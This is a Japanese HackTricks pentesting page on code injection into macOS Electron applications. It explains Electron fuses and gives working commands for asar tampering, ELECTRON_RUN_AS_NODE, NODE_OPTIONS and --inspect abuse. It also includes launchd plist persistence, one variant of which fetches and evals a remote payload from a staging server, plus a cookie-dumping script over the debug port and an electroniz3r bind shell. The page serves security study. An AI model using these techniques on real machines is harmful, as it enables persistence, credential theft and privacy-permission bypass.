# macOS Electronアプリケーションのインジェクション

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングテクニックを共有してください。

</details>
{% endhint %}

## 基本情報

Electronが何かわからない場合は、[**こちらで多くの情報を見つけることができます**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。ただし、今のところは、Electronが**node**を実行することを知っておくだけで十分です。\
そして、nodeには、指定されたファイル以外のコードを実行するために使用できる**パラメータ**や**環境変数**がいくつかあります。

### Electron Fuses

これらのテクニックは次に議論されますが、最近のElectronにはこれらを**防ぐためのいくつかのセキュリティフラグ**が追加されています。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリケーションが**任意のコードを読み込むのを防ぐ**ために使用されるものです:

* **`RunAsNode`**: 無効にすると、環境変数**`ELECTRON_RUN_AS_NODE`**の使用を防ぎ、コードのインジェクションを防ぎます。
* **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`、`--inspect-brk`などのパラメータが尊重されなくなります。これにより、コードのインジェクションが防止されます。
* **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**がmacOSによって**検証**されます。このファイルの内容を変更してコードのインジェクションを防ぎます。
* **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込みを検索する代わりに: **`app.asar`**、**`app`**、最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせると、検証されていないコードを読み込むことが**不可能**になります。
* **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスはV8スナップショットに`browser_v8_context_snapshot.bin`というファイルを使用します。

コードインジェクションを防ぐことはないが、興味深いフューズもあります:

* **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアがOSレベルの暗号化キーを使用して暗号化されます。

### Electron Fusesの確認

アプリケーションからこれらのフラグを**確認**することができます:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fusesの変更

[**ドキュメントに記載**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode) されているように、**Electron Fuses**の構成は、**Electronバイナリ**内に構成されており、どこかに文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** が含まれています。

macOSアプリケーションでは、通常、`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`に配置されています。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
## Electronアプリケーションへのコード追加によるRCE

Electronアプリケーションが使用している**外部のJS/HTMLファイル**が存在する可能性があり、攻撃者はこれらのファイルにコードをインジェクトし、その署名がチェックされないため、アプリケーションのコンテキストで任意のコードを実行できます。

{% hint style="danger" %}
ただし、現時点では2つの制限があります：

- **`kTCCServiceSystemPolicyAppBundles`**権限が必要です。したがって、デフォルトではこれは不可能になりました。
- 通常、コンパイルされた**`asap`**ファイルには、**`embeddedAsarIntegrityValidation`**および**`onlyLoadAppFromAsar`**のヒューズが**有効**になっています。

これにより、この攻撃経路がより複雑になり（または不可能になり）ます。
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`**の要件をバイパスすることが可能であり、アプリケーションを別のディレクトリ（たとえば**`/tmp`**）にコピーし、フォルダ名を**`app.app/Contents`**から**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、それを**`app.app/Contents`**に戻して実行することができます。

asarファイルからコードを展開することができます。
```bash
npx asar extract app.asar app-decomp
```
そして、それを修正した後にパックし直します。
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` を使用した RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)によると、この環境変数が設定されている場合、プロセスは通常の Node.js プロセスとして開始されます。
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
**`RunAsNode`** フューズが無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、これは機能しません。
{% endhint %}

### アプリ Plist からのインジェクション

[**こちらで提案されている**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)ように、この環境変数を plist に悪用して持続性を維持することができます。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`を使用したRCE

異なるファイルにペイロードを保存して実行することができます:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
**`EnableNodeOptionsEnvironmentVariable`**が**無効**になっている場合、アプリは起動時に環境変数**NODE\_OPTIONS**を**無視**します。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、その環境変数も**無視**されます。なお、**`RunAsNode`**が無効になっている場合も同様です。

**`ELECTRON_RUN_AS_NODE`**を設定しないと、次の**エラー**が発生します: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### アプリPlistからのインジェクション

これらのキーを追加して持続性を維持するために、この環境変数をplistで悪用することができます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 検査によるRCE

[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、Electronアプリケーションを**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`**などのフラグを使用して実行すると、**デバッグポートがオープン**され、それに接続できるようになります（たとえば、Chromeの`chrome://inspect`から）。そのため、**コードを注入**したり、新しいプロセスを起動したりすることができます。\
例えば：

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
**`EnableNodeCliInspectArguments`** フューズが無効になっている場合、アプリは起動時に `--inspect` のようなノードパラメータを**無視**しますが、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は**無視**されます。ただし、フューズ **`RunAsNode`** が無効になっている場合も同様です。

ただし、**electron パラメータ `--remote-debugging-port=9229`** を使用することはできますが、前述のペイロードは他のプロセスを実行するためには機能しません。
{% endhint %}

**`--remote-debugging-port=9222`** パラメータを使用すると、Electronアプリから**履歴**（GETコマンドで）やブラウザの**クッキー**（ブラウザ内で**復号**され、それらを提供する**jsonエンドポイント**があるため）などの情報を盗むことができます。

これについては、[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)や[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で詳しく学ぶことができ、自動ツール [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) や以下のようなシンプルなスクリプトを使用できます：
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**このブログポスト**](https://hackerone.com/reports/1274695) では、このデバッグを悪用して、ヘッドレスクロームが**任意の場所に任意のファイルをダウンロード**するようにします。

### アプリ Plist からのインジェクション

この環境変数を plist で悪用することで、次のキーを追加して持続性を維持できます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 古いバージョンを悪用したTCCバイパス

{% hint style="success" %}
macOSのTCCデーモンは、アプリケーションの実行バージョンをチェックしません。したがって、前述のいずれのテクニックでもElectronアプリケーションにコードをインジェクトできない場合は、以前のバージョンのAPPをダウンロードしてコードをインジェクトすることができます。それでもTCC権限を取得します（Trust Cacheがそれを防止しない限り）。
{% endhint %}

## JSコード以外のコードを実行する

前述のテクニックを使用すると、**Electronアプリケーションのプロセス内でJSコードを実行**できます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイル**で実行され、**TCC権限を継承**します。\
したがって、たとえばカメラやマイクへのアクセス権を悪用したい場合は、**プロセスから別のバイナリを実行**するだけで済みます。

## 自動インジェクション

ツール[**electroniz3r**](https://github.com/r3ggi/electroniz3r)は、インストールされている**脆弱性のあるElectronアプリケーションを見つけ**、それらにコードをインジェクトするのに簡単に使用できます。このツールは**`--inspect`**テクニックを使用しようとします：

自分でコンパイルする必要があり、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考文献

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
